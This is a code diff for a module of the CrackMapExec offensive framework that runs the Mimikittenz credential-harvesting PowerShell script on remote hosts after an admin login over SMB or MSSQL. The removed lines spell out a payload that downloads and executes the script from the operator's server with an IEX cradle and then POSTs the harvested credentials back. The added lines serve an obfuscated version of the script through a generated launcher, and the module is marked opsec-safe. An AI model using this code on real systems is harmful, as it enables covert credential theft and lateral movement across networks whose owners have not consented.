@@ -1,7 +1,7 @@
-from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log, gen_random_string
+from cme.helpers.powershell import *
+from cme.helpers.logger import write_log
 from StringIO import StringIO
 from datetime import datetime
-from sys import exit
 
 class CMEModule:
     '''
@@ -10,46 +10,33 @@ class CMEModule:
     '''
 
     name = 'mimikittenz'
-
     description = "Executes Mimikittenz"
+    supported_protocols = ['mssql', 'smb']
+    opsec_safe = True
+    multiple_hosts = True
 
     def options(self, context, module_options):
         '''
         '''
-
-        self.obfs_name = gen_random_string()
+        self.ps_script = obfs_ps_script('mimikittenz/Invoke-mimikittenz.ps1')
+        return
 
     def on_admin_login(self, context, connection):
+        command = 'Invoke-mimikittenz'
+        launcher = gen_ps_iex_cradle(context, 'Invoke-mimikittenz.ps1', command)
+        ps_command = create_ps_command(launcher)
 
-        payload = '''
-        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-mimikittenz.ps1');
-        $data = Invoke-{command};
-        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
-        $request.Method = 'POST';
-        $request.ContentType = 'application/x-www-form-urlencoded';
-        $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);
-        $request.ContentLength = $bytes.Length;
-        $requestStream = $request.GetRequestStream();
-        $requestStream.Write( $bytes, 0, $bytes.Length );
-        $requestStream.Close();
-        $request.GetResponse();'''.format(server=context.server, 
-                                          port=context.server_port, 
-                                          addr=context.localip,
-                                          command=self.obfs_name)
-
-        context.log.debug('Payload: {}'.format(payload))
-        payload = create_ps_command(payload)
-        connection.execute(payload)
-        context.log.success('Executed payload')
+        connection.execute(ps_command)
+        context.log.success('Executed launcher')
 
     def on_request(self, context, request):
         if 'Invoke-mimikittenz.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('mimikittenz/Invoke-mimikittenz.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read(), function_name=self.obfs_name)
-                request.wfile.write(ps_script)
+            #with open(get_ps_script('mimikittenz/Invoke-mimikittenz.ps1'), 'r') as ps_script:
+            #    ps_script = obfs_ps_script(ps_script.read(), function_name=self.obfs_name)
+            request.wfile.write(self.ps_script)
 
         else:
             request.send_response(404)
